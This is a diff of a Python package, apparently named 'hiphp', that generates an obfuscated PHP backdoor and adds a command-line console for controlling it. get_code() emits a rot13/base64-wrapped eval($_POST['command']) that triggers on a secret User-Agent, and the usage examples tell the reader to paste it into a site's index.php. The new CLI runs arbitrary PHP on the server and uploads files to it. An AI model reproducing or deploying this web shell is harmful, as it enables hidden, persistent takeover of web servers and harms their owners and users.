@@ -6,7 +6,6 @@
 # USAGE :
 #s
 from hiphp import hiphp
-
 p1=hiphp("<PASSWORD>","<http://THE/LINK/TO/THE/PHP/FILE/THAT/CONTAINS/THE/HIPHP/ID>",False) #In order to print the result directly.
 #p1=hiphp("<PASSWORD>","<http://THE/LINK/TO/THE/PHP/FILE/THAT/CONTAINS/THE/HIPHP/ID>") #In order to make the result as a variable.
 print(p1.get_code()) #Get HIPHP ID for first use.
@@ -21,7 +20,6 @@ p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>","./<THE_PATH_YOU_WANT_TO_UPLOA
 # EXAMPLES :
 #s
 from hiphp import hiphp
-
 p1=hiphp("123","http://localhost/index.php",False)
 
 # Example:1
@@ -35,7 +33,6 @@ eval(str_rot13(base64_decode(str_rot13(base64_decode('bkpMYldTOUdFSVdKRUlXb1cwdU
 '''
 # Copy this code into the file whose path you entered earlier.
 # for example: https://localhost/index.php
-
 
 # Example:2
 # Command:
@@ -100,8 +97,12 @@ p1.upload("picture_example.png","./pictures/")
 ##################################################################
 # CHANGELOG :
 #s
+## 0.1.11
+ - Command interface update.
+ - Bug fixes & performance improvements.
+
 ## 0.1.10
-- Fix Bugs.
+ - Fix Bugs.
 
 ## 0.1.9
  - fix bugs.
@@ -142,7 +143,7 @@ p1.upload("picture_example.png","./pictures/")
 ##################################################################
 """
 # VALUES :
-__version__="0.1.10"
+__version__="0.1.11"
 __name__="hiphp"
 __author__="Yasser Bdj (Boudjada Yasser)"
 __author_email__="yasser.bdj96@gmail.com"
@@ -159,21 +160,16 @@ __Installation__="pip install "+__name__+"=="+__version__
 __license__='MIT License'
 __copyright__='Copyright © 2008->Present, '+__author__+"."
 __license_text__=f'''MIT License
-
 {__copyright__}
-
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 copies of the Software, and to permit persons to whom the Software is
 furnished to do so, subject to the following conditions:
-
 The above copyright notice and this permission notice shall be included in all
 copies or substantial portions of the Software.
-
 You also agree that if you become very rich you will give me 1% of your wealth.
-
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
@@ -189,12 +185,14 @@ from pipincluder import pipincluder
 exec(pipincluder("import requests",
                  "from ashar import ashar",
                  "from hexor import hexor",
-                 "import re,base64,os").modules())
+                 "import re,base64,os",
+                 "import yasserbdj96").modules())
 
 #start hiphp class:
 class hiphp:
     #__init__:
     def __init__(self,key,url,returns=True):
+        self.pp=key
         self.key=ashar(key,key).encode()
         self.url=url        
         self.headers={'User-Agent':self.key}
@@ -209,14 +207,76 @@ class hiphp:
         else:
             hiphp.do(self.url,self.headers,command,self.returns)
 
+    #logo:
+    def logo(self):
+        p1=hexor(True,"hex")
+        p2=hexor(False,"hex")
+
+        logo="""
+      ██╗  ██╗██╗██████╗ ██╗  ██╗██████╗ 
+      ██║  ██║██║██╔══██╗██║  ██║██╔══██╗
+      ███████║██║██████╔╝███████║██████╔╝
+      ██╔══██║██║██╔═══╝ ██╔══██║██╔═══╝ 
+      ██║  ██║██║██║     ██║  ██║██║     
+      ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝  ╚═╝╚═╝"""
+
+        s=[]
+        arr=["╦:::#7e4367","╚:::#7e4367","╝:::#7e4367","╩:::#7e4367","╔:::#7e4367","╗:::#7e4367","╠:::#7e4367","═:::#7e4367","║:::#7e4367",
+             "╣:::#7e4367","█:::#db61a2"]
+        for i in range(len(arr)):
+            s.append(p1.c(arr[i].split(":::")[0],arr[i].split(":::")[1]))
+            logo=logo.replace(arr[i].split(":::")[0],s[i])
+
+        print(logo)
+        print(yasserbdj96.about(__version__))
+        print("\n")
+
+        s1=p1.c("[","#db61a2")
+        s2=p1.c("*","#7e4367")
+        s3=p1.c("*","#db61a2")
+        s4=p1.c("]","#db61a2")
+        print(s1+s2+s3+s2+s4+p1.c(f" Contacting to '{self.url}' ........","#f7df1e")+p1.c("[done!]","#94c856"))
+
+        print("\n")
+        p2.c(" - You are now connected safety. You can print the PHP commands below for comprehensive control of the site.","#db61a2")
+        p2.c(" - If you are having difficulties controlling the program, you can type '--help'","#f34f29")
+        p2.c(" - Ctrl+C for exit :)","#f34f29")
+
+        print("\n")
+
     #cli:
-    def cli(self):
-        command=input('hiphp>>>')
+    def cli(self,see=True):
+        p1=hexor(True,"hex")
+        if see==True:
+            hiphp.logo(self)
+        if os.name == 'nt':
+            ch="@"
+        else:
+            ch="💀"
+        
+        p=hiphp(self.pp,self.url,True).run("echo getcwd();")
+        print("┌──("+p1.c(f'hiphp{ch}{self.url}',"#db61a2")+f")──[{p1.c(p,'#db61a2')}]")
+        command=input("└─>")
         if command:
-            hiphp.do(self.url,self.headers,command,self.returns)
+            if command=="--help":
+                print("-rf <PHP_CODE_FILE_PATH>                    |   # Run a code or line in your website from a file.")
+                print("-up <THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>   |   # Upload a file to the server hosting the site.")
+                print("-up <FILE_PATH> ./<THE_PATH_YOU_WANT_TO_UPLOAD_THE_FILE_TO>")
+            elif command[0:3]=="-rf":
+                hiphp.run_file(self,command[4:len(command)])
+            elif command[0:3]=="-up":
+                try:
+                    file,to=command[4:len(command)].split(" ")
+                    hiphp.upload(self,file,to)
+                except:
+                    hiphp.upload(self,command[4:len(command)])
+            elif command[0:3]=="-gc":
+                print(hiphp.get_code(self))
+            else:
+                hiphp.do(self.url,self.headers,command,self.returns)
         else:
             print(p1.c("Command not found!","#ff5b3c"))
-        hiphp.cli(self)
+        hiphp.cli(self,False)
 
     #run_file:
     def run_file(self,file,*opts):        
@@ -247,6 +307,7 @@ class hiphp:
             hiphp.run(self,f'Fwrite(fopen("{to+os.path.basename(path_to_upluad)}","w+"),base64_decode("{encoded_string.decode("utf-8")}"));')
         except:
             self.print.c(f"We could not read the file {path_to_upluad}","#ff5b3c")
+
     #do:
     def do(url,headers,command,returns):
         response=requests.post(url,headers=headers)
@@ -284,10 +345,11 @@ class hiphp:
     def get_code(self):
         code="if($_SERVER['HTTP_USER_AGENT']=='"+self.key+"'){echo'#python';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
         code=hiphp.rot13(code)
-        code=hiphp.rot13(code)
         code=ashar.tob64(code)
         code=hiphp.rot13(code)
         code=ashar.tob64(code)
-        code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode('{code}')))));"
+        code=hiphp.rot13(code)
+        code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('{code}'))))));"
+        
         return self.print2.c("/*php code start*/\n","#31ad22")+self.print2.c(code,"#539bf5")+self.print2.c("\n/*php code end*/","#31ad22")
 #e
